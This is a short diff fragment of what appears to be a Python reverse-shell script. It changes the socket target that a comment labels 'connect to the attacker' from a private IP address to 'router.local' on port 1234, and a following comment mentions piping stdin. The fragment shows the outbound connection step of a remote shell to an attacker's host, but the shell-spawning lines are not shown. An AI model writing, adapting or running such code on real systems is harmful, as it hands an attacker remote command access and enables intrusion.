@@ -12,7 +12,7 @@ import os;
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
 
 '''connect to the attacker''' 
-s.connect(('192.168.178.41', 1234));
+s.connect(('router.local', 1234));
 '''s.connect(('localhost', 1234));'''
 
 '''pipe stdin'''
